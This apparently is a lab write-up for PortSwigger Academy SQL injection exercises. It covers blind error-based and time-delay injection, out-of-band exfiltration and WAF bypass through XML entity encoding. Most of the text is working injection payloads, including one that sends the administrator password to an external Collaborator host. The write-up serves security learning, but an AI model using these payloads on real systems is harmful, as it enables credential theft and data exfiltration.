~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

With 1=1 we get a 500 error code:

![img](media/21503552b952b5dc825b88772b610534.png)

With 1=2 we get a 200 code:

![img](media/e5795ab904173be2d77fa133b83935dc.png)

For the first letter of the administrator user's password we will user (using
SUBSTR because it is Oracle):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/9cad55f3d5b769a5e970b7d0311ea410.png)

We send this to the Intruder and test all letters and numbers until one
generates a 500 error code:

![img](media/30909ec39fdd9fd024ad552066dd83bd.png)

We get the first letter is "0":

![img](media/6d3f1f843a5d0a49d5bcd0178d009b12.png)

If we continue we get the password 01k6j5tbrjpd9lpdk4zs

13 Blind SQL injection with time delays
=======================================

This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs a SQL query containing the value of
the submitted cookie.

The results of the SQL query are not returned, and the application does not
respond any differently based on whether the query returns any rows or causes an
error. However, since the query is executed synchronously, it is possible to
trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second
delay.

References:

-   https://portswigger.net/web-security/sql-injection/blind

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

There is a SQL injection in the cookie. It uses PostgreSQL, sleep 10 seconds
with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE'||pg_sleep(10)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TGjY2hbNNRAamLIb'||pg_sleep(10)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/e48cb0518d2c197702a54fe13be22be3.png)

14 Blind SQL injection with time delays and information retrieval
=================================================================

This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs a SQL query containing the value of
the submitted cookie.

The results of the SQL query are not returned, and the application does not
respond any differently based on whether the query returns any rows or causes an
error. However, since the query is executed synchronously, it is possible to
trigger conditional time delays to infer information.

The database contains a different table called users, with columns called
username and password. You need to exploit the blind SQL injection vulnerability
to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

References:

-   https://portswigger.net/web-security/sql-injection/blind

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

It is possible to exploit the SQLI and make the server wait 10 seconds with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE'||pg_sleep(10)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jIPoq0qYcS0Y2AmF'||pg_sleep(10)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We will start with a comparison of 1=1 and 1=2 to see it sleeps only in the
first case:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Then we will add a check to find the first character of the password:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It seems it is working. We send it to Intruder:

![img](media/dabe74c5ce9bd537955d675e31907575.png)

And one of the characters take longer to receive the response, in this case “v”:

![img](media/078d46ea3e963084f4eb327e4881b70f.png)

Continue character by character nutil getting the password
“v06vaymszli7v131izpv”:

![img](media/378f1bb2e4f34cdf80870460e8786e20.png)

15 Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet




---------------------------------------------


### Oracle
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

```
FFyToxqSs49lpxuC'+AND+select+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://q6xv6nktkah599jksflne4qcz35utqhf.oastify.com/">+%remote%3b]>'),'/l')+FROM+dual--

FFyToxqSs49lpxuC'+AND+SELECT+UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--
```

### Microsoft
```
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

```
FFyToxqSs49lpxuC'+and+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'--
```

### PostgreSQL
```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

```
FFyToxqSs49lpxuC'+||+(copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN')--
```


### MySQL
```
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

```
FFyToxqSs49lpxuC'+AND+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
```

-----------------------------------------------

Finally, the correct payload was the Oracle payload, changing the AND for a UNION and encoding the characters ;, ? and =:

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/1.png)




![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/2.png)

16 Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.


---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


The payload for out-of-band interaction is:

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

We will try this:

```
SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual
```

```
FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;
```

First I test it when the first character is different to “a” and see there is an interaction:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/1.png)



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/2.png)

We send this to the Intruder and set two positions, one for the character for the comparison and the other the subdomain. We set the type to “Battering Ram”:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/3.png)

We find there was a query for the letter “e”:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/4.png)

Knowing this we could go character by character and get the password “e6jomps7kptnx04vcvtz”.

We can also use the query in the cheat-sheet:

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```


```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/5.png)

17 SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

Hint: A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection

- https://portswigger.net/web-security/sql-injection/cheat-sheet



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/1.png)

---------------------------------------------


The following payload allows to execute (SELECT 1), which returns the same as sending productId 1 and storeId 1:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		(&#x53;ELECT 1)
	</productId>
	<storeId>
		(&#x53;ELECT 1)
	</storeId>
</stockCheck>
```





![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/2.png)
![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/3.png)

We can encode it to HTML with Burp to avoid detection. The whole query “(SELECT 1)” HTML-encoded is:

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x31;)
```


Next we see this query works:

```
SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END
```

```
<productId>
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x31;&#x3d;&#x31;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;&#x0a;)
</productId>
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/4.png)

Next I will retrieve the version:

```
SELECT CASE WHEN (substring((SELECT version()),1,1)='a') THEN 1 ELSE 2 END
```

I sent it to Intruder and added delay between requests:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/5.png)

The version starts with "P":



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/6.png)

Then “o”:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/7.png)

It start with "PostgreSQL":

```
SELECT CASE WHEN (substring((SELECT version()),1,10)='PostgreSQL') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x30;&#x29;&#x3d;&#x27;&#x50;&#x6f;&#x73;&#x74;&#x67;&#x72;&#x65;&#x53;&#x51;&#x4c;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/8.png)

```
SELECT CASE WHEN (substring((SELECT table_name FROM information_schema.tables limit 1),1,5)='users') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x35;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```

It returns the same as sending the value 1 (the lab restarted so it is now 370, not 356) so the table "users" exists:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/9.png)

Then we will try to find the fits column name from “users” table with:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,1)='a') THEN 1 ELSE 2 END
```

```
(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;AAAAAAAA&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)
```

We get the same response as sending 1 with the character “u”, so it starts with u and it probably starts with "user":



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/10.png)

It seems it starts with "user":

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,4)='user') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x34;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/11.png)

We send this to repeater and find the next letter is “n”, so it may be “username”:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,5)='userZ') THEN 1 ELSE 2 END
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/12.png)

Then check the first column name starts with “username”:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,8)='username') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/13.png)

Then we send to Intruder:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,9)='usernameZ') THEN 1 ELSE 2 END
```

But it seems there are not more characters in this column name, it is “username”.



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/14.png)

Next we will find if the second column starts with password:

```
SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' and column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END
```

```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x21;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

It seems to be correct:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/15.png)

We will try to get the first character of the password with:

```
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END
```


```
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

It starts with “h”:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/16.png)

Finally I got the administrator's password:



![img](images/SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/17.png)
